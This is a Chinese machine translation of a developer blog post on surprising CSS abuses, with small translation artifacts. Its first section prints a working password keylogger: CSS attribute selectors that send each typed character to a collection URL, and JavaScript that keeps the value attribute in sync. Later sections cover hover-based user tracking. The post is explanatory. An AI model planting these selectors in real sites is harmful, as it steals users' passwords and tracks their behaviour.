# CSS 可以做到这一点...而且很恐怖！

> 原文：<https://dev.to/aaronpowell/css-can-do-this-and-it-s-terrifying-3lp8>

*封面图片由 [@maxwell_dev](https://dev.to/maxwell_dev) 拍摄。*

液体错误:内部

受今天的*# dev discuse*的启发，我用 CSS 中我最喜欢的恶行来评论。

液体错误:内部

所以让我们来看看它们是如何工作的。

## CSS 键盘记录器

你可以使用 CSS 来创建一个键盘记录器，这已经[存在了一段时间了](https://github.com/maxchehab/CSS-Keylogging/)，但是正如[这篇文章](https://www.bram.us/2018/02/21/css-keylogger-and-why-you-shouldnt-worry-about-it/)中正确指出的，它不“仅仅是 CSS”，它确实依赖于一些 JavaScript。所以我们来剖析一下它是如何工作的。

我们的选择器是这样的:

```
input[type="password"][value$="a"] {
    background-image: url("http://localhost:3000/a");
} 
```

Enter fullscreen mode Exit fullscreen mode

假设你想记录的每一个字符都是重复的。

选择器的重要部分是`value`上的子串匹配，这部分:`[value$="a"]`。这是一个[属性选择器](https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors)，特别是作为 [CSS 3](https://drafts.csswg.org/selectors-3/#attribute-substrings) 的一部分添加的子串选择器，它的作用是当 DOM 元素的`value`属性以`a`结束时，它将进行匹配(如果你愿意，可以使用`^`作为 begins with)。

所以当`value`属性包含它时，我们就匹配了，但是如果你查看页面上表单的 DOM，你会注意到,`value`属性没有被设置。

如果您在浏览器中打开表单上的开发工具，您会注意到当您键入输入时，**属性**不会改变，它总是被设置为`Test here`。但是如果你使用 JavaScript 来检查这个值，`document.getElementById('demo-01').value`就会得到你输入的值*。这是因为属性表示的是`<input>`的[默认值](https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#concept-fe-value)，而不是当前值，这可能是需要计算的，具体取决于输入的类型。*

在 CSS 中创建一个键盘记录器对我们来说意味着什么？嗯，简单的事实是，你不能用 CSS 创建一个纯粹的**，但是你可以用 CSS 和一点 JavaScript 创建一个，因为我们需要在这个过程中更新`value`属性。**

 **这很容易做到，你只需要一些像这样的 JavaScript】

```
let inputs = document.getElementsByTagName("input");

for (let i = 0; i < inputs.length; i++) {
    let input = inputs[i];

    input.addEventListener("keypress", e => {
        e.preventDefault();
        let char = String.fromCharCode(e.keyCode);
        let newValue = input.value + char;
        input.setAttribute("value", newValue);
        input.setSelectionRange(newValue.length, newValue.length);
    });
} 
```

Enter fullscreen mode Exit fullscreen mode

这样做的目的是，它“假装”你在适当地做你的`keypress`，通过提前捕捉它，然后将你*想要*输入的字符推到`value`属性上，使它看起来像你在正常输入。然后我们在输入中使用`setSelectionRange`方法将插入符号定位到输入的末尾，这样您就不会知道了。[在这里可以找到一个关于这个动作的演示](https://www.aaron-powell.com/demos/css-hacking/keylogger/)。

但是如果您能够运行 JavaScript 来绕过 DOM 的工作方式，为什么还要为 CSS 费心呢？问题不在于你写的代码，而在于你可能利用的代码，尤其是 UI 框架。

例如，如果你使用的是一个受控的表单，React 将使属性与状态同步，这是本期追踪的[内容。因此，如果你在一个使用 React 的网站上，那么这个网站很容易受到这种攻击，无论是通过你浏览器中的扩展还是网站上运行的一些不可靠的广告。](https://github.com/facebook/react/issues/11896)

是的，您需要 JavaScript 来正确实现“CSS 键盘记录器”，但这并不意味着您必须编写 JavaScript。

我只想快速地触及作者在[这篇文章](https://www.bram.us/2018/02/21/css-keylogger-and-why-you-shouldnt-worry-about-it/)中的一些观点。他们说这没什么大不了的，因为`background-image`只在第一次匹配时完成，所以重复的字符不会被拾取(例如，`password`的密码会错过`s`，这是真的(在`pass`处`value`没有改变最后一个字符，所以选择器没有被触发)但是数据捕获将包括时间戳，如果你获取事件时间戳之间的差异水平，你可以推断出你自己的差距(如果捕获之间花费了 0.1 毫秒，然后有 0.5 毫秒，可能一些字符被捕获)对于接收顺序没有保证的观察也是如此。这是真的，服务器可能会无序地接收它们，但是当您拥有一个密码的所有(或 90+%)字符时，暴力破解的能力会急剧下降。

## 用 CSS 进行用户跟踪

这并不像键盘记录器那样可怕，但是它借用了键盘记录器的基本原理。

为此，我们将利用 [CSS 伪类](https://developer.mozilla.org/en-US/docs/Web/CSS/Pseudo-classes)，它允许我们挂接 DOM 元素的许多事件。

[https://codepen.io/aaronpowell/embed/PoYZLGe?height=600&default-tab=result&embed-version=2](https://codepen.io/aaronpowell/embed/PoYZLGe?height=600&default-tab=result&embed-version=2)

下面是我应用于这些元素的 CSS:

```
#demo-02 p:hover {
    background-color: #f0a;
}

#demo-02 input:focus {
    background-color: #bada55;
}

#demo-02 button:active {
    color: #ff0000;
} 
```

Enter fullscreen mode Exit fullscreen mode

我只是使用类似于`:hover`、`:focus`和`:active`的伪类来知道你什么时候做了什么，然后改变一些颜色，但是我也可以将`background-image`设置为一个跟踪 URL。

如何让它变得有用？嗯，把它想象成实现 Google Analytics，你可以做一些事情，比如把一个`:hover`状态附加到`body`元素上，这样你就知道页面什么时候向用户显示，然后在所有子元素上显示更多的悬停状态；当用户在页面上移动时，你可以捕捉到他们光标的大概位置，知道他们在做什么。如果有一个表格，你可以计算出他们在每个字段上花了多长时间，他们如何在一个多步骤的表格中向前和向后导航，或者他们是否改变单选按钮/复选框上的答案。

像键盘记录器一样，它并不像看起来那么简单，你必须对 DOM 的结构有一个很好的概念才能创建一个真正精细的跟踪器(或者使用 JavaScript)，但是如果你用它来进行你自己的分析，这是非常容易实现的。

## CSS 是否图灵完成

*好吧，CSS + HTML 如果你想迂腐*但这是真的，只用 CSS 和 HTML 就可以实现[规则 110](https://en.wikipedia.org/wiki/Rule_110) :

[https://www.youtube.com/embed/Ak_sWZyHi3E](https://www.youtube.com/embed/Ak_sWZyHi3E)
it 的[工作实例归功于 GitHub 上的](https://github.com/elitheeli/stupid-machines/tree/master/rule110)[埃利希里](https://github.com/elitheeli)。

这是通过滥用伪类来实现的，比如我们的 tracker，并将这些伪类与[相邻兄弟组合符](https://developer.mozilla.org/en-US/docs/Web/CSS/Adjacent_sibling_combinator)相结合。相邻的 sibing 组合子，或简称为`+`，是这样工作的:

[https://codepen.io/aaronpowell/embed/GRKoerx?height=600&default-tab=result&embed-version=2](https://codepen.io/aaronpowell/embed/GRKoerx?height=600&default-tab=result&embed-version=2)

```
#demo-03 p {
    color: #00bb00;
}

#demo-03 p + p {
    font-family: "Comic Sans MS", sans serif;
    font-style: italic;
} 
```

Enter fullscreen mode Exit fullscreen mode

这里我们将规则应用于所有的`p`元素，但是我们使用相邻的兄弟选择器将规则仅应用于第二个`p`(在这种情况下，打开不同的字体系列和样式)。通过在选择器的前半部分应用条件，比如一个 pesudo-class，可以极大地限制规则的级联。

## 表情符号类名

谁不喜欢在工作中自由使用表情符号呢？你知道你可以在 CSS 中使用表情符号作为类名吗？根据规范的[，它们在技术上*是有效的*，这意味着你可以这样做:](https://www.w3.org/TR/CSS21/syndata.html#characters)

[https://codepen.io/aaronpowell/embed/yLBewgm?height=600&default-tab=result&embed-version=2](https://codepen.io/aaronpowell/embed/yLBewgm?height=600&default-tab=result&embed-version=2)

```
#demo-04 .🤣 {
    font-family: "Comic Sans MS";
    text-decoration: #f0a underline overline wavy;
    text-shadow: 2px 2px #bada55;
    transform: rotate(45deg);
    display: inline-block;
} 
```

Enter fullscreen mode Exit fullscreen mode

实际上[你可能不应该这么做](http://adrianroselli.com/2017/10/avoid-emoji-as-class-names.html)，但是，嘿，为了让一些用户不能访问你的站点(或者你的代码库上的 dev)，你可以通过网络减少几个字节！

## 结论

从一条废弃的推文开始，成为了我几年来一直想写的一篇文章的催化剂！🤣

我希望你已经喜欢看一些你可以用 CSS 做的事情，但是也许 T2 不应该做。

你最喜欢利用 CSS 的方式是什么？**